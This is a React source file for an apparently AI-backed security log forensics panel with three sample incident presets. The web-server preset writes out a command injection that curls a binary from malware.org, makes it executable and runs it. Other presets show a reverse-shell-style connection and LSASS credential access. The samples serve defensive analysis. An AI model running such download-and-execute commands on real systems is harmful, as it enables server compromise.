import React, { useState } from 'react';
import { 
  ShieldAlert, Sparkles, Terminal, Cpu, FileCode, CheckCircle, 
  HelpCircle, RefreshCw, ChevronRight, AlertCircle, Copy
} from 'lucide-react';

interface AnalysisResult {
  severity: 'Mild' | 'Moderate' | 'Severe' | 'Critical';
  mitreTactic: string;
  mitreTechnique: string;
  detectionMechanism: string;
  remediation: string;
  explanation: string;
}

const LOG_PRESETS = [
  {
    label: "Incident 1: eBPF Code Hijack",
    description: "Linux /proc kernel pointer overwrite and memory injection payload.",
    content: `[2026-06-15 11:21:05] AUDIT: syscall SECCOMP block bypassed on pid 14023: /tmp/memfd_create (deleted)
[2026-06-15 11:21:05] WARNING: kernel ring_buffer alert in kprobe/sys_execve: root privilege escalation mapping detected
[2026-06-15 11:21:05] KERNEL: sys_ptrace invoked from unauthorized thread PID 14023 targetting systemd PID 1
[2026-06-15 11:21:06] TCP: Outbound connection established: 10.140.24.81:49210 -> 185.120.30.22:4444 (State: CONNECT_ESTABLISHED)`
  },
  {
    label: "Incident 2: ETW Credential Dump",
    description: "Windows NT LSASS memory space reads triggered by interactive powershell.",
    content: `ProviderName: Microsoft-Windows-Kernel-Process
TimeCreated: 2026-06-15T15:37:02.190Z
EventID: 10 (ProcessAccess)
SourceProcessId: 4322 (powershell.exe)
TargetProcessId: 1102 (lsass.exe)
CallStack: C:\\Windows\\SYSTEM32\\ntdll.dll+0xa210a | C:\\Windows\\System32\\power_module.dll+0x24ff | C:\\Windows\\System32\\winhelper.dll+0x1a830
GrantedAccess: 0x1FFFFF (FULL REQUESTED PROCESS READ WRITE MEMORY ACCESS)`
  },
  {
    label: "Incident 3: Web Server Shell Spawn",
    description: "Suspicious Apache service worker spawning child bash commands.",
    content: `[2026-06-15 08:31:01] APACHE-DAEMON: connection parsed from 45.33.22.10
[2026-06-15 08:31:02] STDOUT: incoming POST payload: /cgi-bin/test-cgi?cmd=uname%20-a;%20id;%20curl%20-s%20http://malware.org/elf%20-o%20/tmp/p
[2026-06-15 08:31:02] SYS_SPAWN: User 'www-data' spawned shell binary: /bin/sh (PID: 98112)
[2026-06-15 08:31:02] EXECVE: bin /bin/sh arguments: -c "uname -a; id; curl -s http://malware.org/elf -o /tmp/p; chmod +x /tmp/p; /tmp/p"`
  }
];

export default function AiIncidentForensics() {
  const [inputText, setInputText] = useState(LOG_PRESETS[0].content);
  const [analysis, setAnalysis] = useState<AnalysisResult | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [errorString, setErrorString] = useState<string | null>(null);

  const triggerAnalyze = async () => {
    setIsAnalyzing(true);
    setErrorString(null);
    setAnalysis(null);

    try {
      const res = await fetch('/api/v1/ai/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rawText: inputText })
      });

      if (res.ok) {
        const data = await res.json();
        setAnalysis(data);
      } else {
        const errorData = await res.json();
        setErrorString(errorData.error || 'Server returned an invalid analytic signal. Please check your workspace env config API keys.');
      }
    } catch (e: any) {
      setErrorString(`Failed to bridge connection to secure Express Backend API service: ${e.message}`);
    } finally {
      setIsAnalyzing(false);
    }
  };

  const loadPreset = (presetText: string) => {
    setInputText(presetText);
    setAnalysis(null);
    setErrorString(null);
  };

  const [copiedNotification, setCopiedNotification] = useState<boolean>(false);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedNotification(true);
    setTimeout(() => setCopiedNotification(false), 3000);
  };

  return (
    <div className="space-y-6" id="ai-forensics-panel">
      
      {/* Header boundary description */}
      <div className="border-b border-zinc-800 pb-4 flex items-center justify-between">
        <div>
          <span className="text-xs font-mono text-emerald-400 uppercase font-bold tracking-wider">SECURE ARTIFICIAL INTELLIGENCE CORE</span>
          <h2 className="text-xl font-bold text-zinc-100 mt-1 font-sans flex items-center gap-2">
            <Sparkles className="h-5 w-5 text-emerald-400 animate-pulse" />
            <span>AI Log Investigator & Forensic Copilot</span>
          </h2>
          <p className="text-xs text-zinc-400 mt-1 leading-relaxed">
            Harness real server-side Gemini 3.5 Flash models to decrypt raw kernel dumps, process traces, and network logs instantly into action-plan playbooks.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
        
        {/* INPUT TELEMETRY LOG BLOCK */}
        <div className="xl:col-span-5 space-y-4">
          <div className="bg-zinc-950 border border-zinc-805 rounded-md p-5 space-y-3">
            <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-widest block font-bold">Log Presets for Quick Evaluation</span>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5">
              {LOG_PRESETS.map((preset, index) => (
                <button
                  key={index}
                  onClick={() => loadPreset(preset.content)}
                  className="p-2.5 bg-zinc-900/40 hover:bg-zinc-900 border border-zinc-850 hover:border-zinc-7e0 text-left rounded transition-all text-[11px] font-mono cursor-pointer"
                >
                  <span className="text-zinc-200 font-bold block">{preset.label}</span>
                  <span className="text-zinc-500 text-[10px] mt-1 block truncate leading-normal">{preset.description}</span>
                </button>
              ))}
            </div>
          </div>

          <div className="bg-zinc-950 border border-zinc-805 rounded-md p-5 space-y-4">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-widest block font-bold">Adversarial Raw Log Text Dump</span>
              <span className="text-[9px] font-mono text-zinc-600 bg-zinc-900 px-2 py-0.5 rounded">eBPF / ETW / Auditd compatible</span>
            </div>

            <textarea 
              value={inputText}
              onChange={(e) => setInputText(e.target.value)}
              className="w-full min-h-[290px] p-4 bg-zinc-950 text-emerald-450 border border-zinc-850 rounded font-mono text-xs focus:outline-none focus:border-zinc-700 leading-relaxed select-text"
              placeholder="Paste raw log vectors here..."
            />

            <button
              onClick={triggerAnalyze}
              disabled={isAnalyzing || !inputText.trim()}
              className="w-full py-2 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-zinc-950 font-bold rounded text-xs uppercase tracking-wider font-sans flex items-center justify-center space-x-2 transition-all cursor-pointer disabled:opacity-50"
            >
              {isAnalyzing ? (
                <>
                  <RefreshCw className="h-4 w-4 animate-spin" />
                  <span>Consulting Security Intelligence...</span>
                </>
              ) : (
                <>
                  <Sparkles className="h-4 w-4 fill-current" />
                  <span>Execute AI Anomaly Forensic Analysis</span>
                </>
              )}
            </button>
          </div>
        </div>

        {/* COMPREHENSIVE HUD ANALYTIC REPORT */}
        <div className="xl:col-span-7 space-y-4">
          
          {isAnalyzing && (
            <div className="p-20 bg-zinc-950 border border-zinc-805 rounded-md flex flex-col items-center justify-center space-y-4">
              <RefreshCw className="h-10 w-10 text-emerald-400 animate-spin" />
              <div className="text-center space-y-1">
                <span className="font-mono text-xs font-bold text-zinc-300 uppercase tracking-wider block">Querying Forensic Models</span>
                <span className="text-[10px] font-mono text-zinc-550 block">Deconstructive pattern processing applied to telemetry sequence...</span>
              </div>
            </div>
          )}

          {errorString && (
            <div className="p-6 bg-rose-955/15 border border-rose-900/40 rounded-md space-y-3 font-mono text-xs">
              <div className="flex items-center space-x-2 text-rose-500">
                <AlertCircle className="h-4 w-4 shrink-0" />
                <span className="font-bold uppercase tracking-wider">Security Advisor Offline</span>
              </div>
              <p className="text-zinc-400 leading-relaxed font-sans">{errorString}</p>
              <div className="p-3 bg-zinc-950 border border-rose-950/45 rounded-sm text-[10px] text-zinc-500 font-sans">
                💡 <strong className="text-zinc-400">Resolution step:</strong> Make sure you have entered your genuine Gemini API key in the bottom left <strong className="text-zinc-300">Secrets (Settings Menu)</strong> of AI Studio. The server binds `process.env.GEMINI_API_KEY` dynamically.
              </div>
            </div>
          )}

          {analysis && (
            <div className="bg-zinc-950 border border-zinc-850 rounded-md p-6 space-y-6">
              
              {/* Core metrics header */}
              <div className="flex flex-col md:flex-row md:items-center justify-between border-b border-zinc-850 pb-5 gap-4">
                <div className="space-y-1">
                  <span className="text-[9px] font-mono font-bold text-zinc-550 uppercase tracking-widest">TACTICAL DECISION TARGET</span>
                  <div className="flex items-center space-x-2.5">
                    <span className={`px-2 py-0.5 text-[10px] font-mono font-bold rounded-sm uppercase tracking-wide ${
                      analysis.severity === 'Critical' ? 'bg-rose-500/15 text-rose-400 border border-rose-500/30' :
                      analysis.severity === 'Severe' ? 'bg-amber-500/15 text-amber-500 border border-amber-500/30' :
                      'bg-cyan-500/15 text-cyan-400 border border-cyan-500/20'
                    }`}>
                      {analysis.severity} Threat Level
                    </span>
                    <h3 className="font-mono text-sm font-bold text-zinc-200 uppercase">{analysis.mitreTactic || 'Generic Anomaly'}</h3>
                  </div>
                </div>

                <button 
                  onClick={() => copyToClipboard(analysis.remediation)} 
                  className="px-2.5 py-1 bg-zinc-900/60 hover:bg-zinc-800 border border-zinc-800 text-zinc-300 text-[10px] rounded-sm transition-colors cursor-pointer font-mono flex items-center justify-center space-x-1.5"
                >
                  <Copy className="h-3 w-3" />
                  <span>Copy Mitigation Script</span>
                </button>
              </div>

              {/* Threat attributes list */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-4 bg-zinc-900/30 border border-zinc-850 rounded-sm font-mono text-xs">
                  <span className="text-[9px] font-mono text-zinc-500 uppercase tracking-widest block font-bold mb-2">MITRE ATT&CK Mapping</span>
                  <div className="space-y-1.5">
                    <div className="text-zinc-450 text-[11px]">
                      Tactic: <strong className="text-zinc-300">{analysis.mitreTactic || 'Unknown'}</strong>
                    </div>
                    <div className="text-zinc-450 text-[11px]">
                      Technique: <strong className="text-zinc-300">{analysis.mitreTechnique || 'Unknown'}</strong>
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-zinc-900/30 border border-zinc-850 rounded-sm font-mono text-xs">
                  <span className="text-[9px] font-mono text-zinc-500 uppercase tracking-widest block font-bold mb-2">Detection Signal Route</span>
                  <div className="space-y-1.5">
                    <div className="text-zinc-450 text-[11px]">
                      Parser Heuristics: <strong className="text-zinc-300">{analysis.detectionMechanism || 'Gemini Core Anomaly'}</strong>
                    </div>
                    <div className="text-zinc-455 text-[11px]">
                      Status: <strong className="text-rose-450 uppercase animate-pulse">INVESTIGATION LOCK</strong>
                    </div>
                  </div>
                </div>
              </div>

              {/* Explanation written markdown style */}
              <div className="space-y-2">
                <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-widest block font-bold">Investigator Deep Forensic Review</span>
                <div className="p-4 bg-zinc-950 border border-zinc-900 rounded-sm text-xs leading-relaxed text-zinc-400 select-text font-sans max-h-[190px] overflow-y-auto whitespace-pre-wrap">
                  {analysis.explanation}
                </div>
              </div>

              {/* Technical playbook remediation */}
              <div className="space-y-2">
                <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-widest block font-bold">Active Defense Remediation Playbook (Dispatched Commands)</span>
                <pre className="p-4 bg-zinc-950 border border-zinc-850 rounded text-[11px] text-emerald-400 font-mono overflow-x-auto leading-relaxed select-all">
                  {analysis.remediation}
                </pre>
              </div>

            </div>
          )}

          {!analysis && !isAnalyzing && !errorString && (
            <div className="h-[490px] border border-dashed border-zinc-800 rounded-md bg-zinc-950/20 flex flex-col items-center justify-center p-6 text-center text-zinc-550 font-mono text-xs space-y-3">
              <Sparkles className="h-10 w-10 text-zinc-700" />
              <div className="space-y-1">
                <span>Analytical Engine Stands Ready.</span>
                <p className="text-[11px] text-zinc-650 font-sans max-w-[340px] leading-relaxed">
                  Submit kernel intercepts or logs, or leverage one of our threat presets to consult the Gemini model for vulnerability intelligence.
                </p>
              </div>
            </div>
          )}

        </div>

      </div>

      {copiedNotification && (
        <div className="fixed bottom-6 right-6 bg-zinc-900 border border-zinc-805 text-emerald-400 px-4 py-3 rounded-sm shadow-xl z-50 flex items-center space-x-3 max-w-sm">
          <span className="w-2 h-2 rounded-full shrink-0 bg-emerald-400 animate-pulse" />
          <span className="text-xs font-mono leading-normal">Mitigation playbook steps copied to clipboard!</span>
        </div>
      )}
    </div>
  );
}
